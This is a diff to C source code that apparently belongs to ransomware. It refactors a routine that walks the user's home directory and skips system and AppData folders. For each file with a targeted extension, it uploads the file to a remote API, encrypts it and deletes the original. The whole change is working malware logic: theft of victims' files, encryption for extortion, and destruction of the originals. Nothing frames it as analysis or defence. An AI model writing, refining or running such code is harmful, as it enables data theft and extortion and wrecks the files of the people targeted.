@@ -225,17 +225,15 @@ void write_to_file(char *filename, char *value, int size){
     fclose(file_pointer);
 }
 
-void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, const char *id, const char *URL){
-    // List all the files we want to encrypt
-    const char *path;
+char* get_user_path() {
     const char *user;
+    char *path;
 
     #ifdef _WIN32
     user = getenv("USERNAME");
     size_t size = snprintf(NULL, 0, "C:\\Users\\%s", user) + 1;
     path = (char *)malloc(size);
     snprintf(path, size, "C:\\Users\\%s", user);
-
     #else
     user = getenv("USER");
     size_t size = snprintf(NULL, 0, "/home/%s", user) + 1;
@@ -244,32 +242,44 @@ void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, con
     printf("%s", path);
     #endif
 
+    return path;
+}
+
+void handle_file(const char *path, const char *id, const char *URL, unsigned char *key, unsigned char *iv, unsigned char *aad) {
+    sendFileToApi(path, id, URL);
+    encrypt_file(key, iv, aad, path);
+    
+    if (remove(path) == 0) {
+        printf("File deleted successfully: %s\n", path);
+    } else {
+        perror("Error deleting file");
+    }
+}
+
+int should_ignore_file(const char *path, const char *ignoreDirs[], size_t num_ignoreDirs) {
+    for (size_t j = 0; j < num_ignoreDirs; ++j) {
+        if (strstr(path, ignoreDirs[j]) != NULL) {
+            return 1;
+        }
+    }
+    return 0;
+}
+
+void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, const char *id, const char *URL) {
+    char *path = get_user_path();
     PathList pathList;
     initPathList(&pathList);
     listFiles(path, &pathList);
+    free(path);
 
     const char *ignoreDirs[] = {
-          "Windows\\",
-          "Program Files\\",
-          "Programmes\\",
-          "Programmes (x86)\\",
-          "Program Files (x86)\\",
-          "ProgramData\\",
-          "$Recycle.Bin\\",
-          "Corbeille\\",
-          "AppData\\",
-      };
-      size_t num_ignoreDirs = sizeof(ignoreDirs) / sizeof(ignoreDirs[0]);
+        "Windows\\", "Program Files\\", "Programmes\\", "Programmes (x86)\\",
+        "Program Files (x86)\\", "ProgramData\\", "$Recycle.Bin\\", "Corbeille\\", "AppData\\"
+    };
+    size_t num_ignoreDirs = sizeof(ignoreDirs) / sizeof(ignoreDirs[0]);
 
     for (size_t i = 0; i < pathList.count; ++i) {
-        int should_ignore = 0;
-        for (size_t j = 0; j < num_ignoreDirs; ++j) {
-            if (strstr(pathList.paths[i], ignoreDirs[j]) != NULL) {
-                should_ignore = 1;
-                break;
-            }
-        }
-        if (should_ignore) {
+        if (should_ignore_file(pathList.paths[i], ignoreDirs, num_ignoreDirs)) {
             continue;
         }
 
@@ -277,16 +287,7 @@ void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, con
         if (extension != NULL) {
             for (size_t j = 0; j < num_extensions; ++j) {
                 if (strcmp(extension, extensions[j]) == 0) {
-                    sendFileToApi(pathList.paths[i], id, URL);
-                    encrypt_file(key, iv, aad, pathList.paths[i]);
-                    remove(pathList.paths[i]);
-                    #ifdef _WIN32
-                    if (remove(pathList.paths[i]) == 0) {
-                        printf("File deleted successfully: %s\n", pathList.paths[i]);
-                    } else {
-                        printf("Error deleting file: %s\n", pathList.paths[i]);
-                    }
-                    #endif
+                    handle_file(pathList.paths[i], id, URL, key, iv, aad);
                     break;
                 }
             }
@@ -294,4 +295,3 @@ void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, con
     }
     freePathList(&pathList);
 }
-
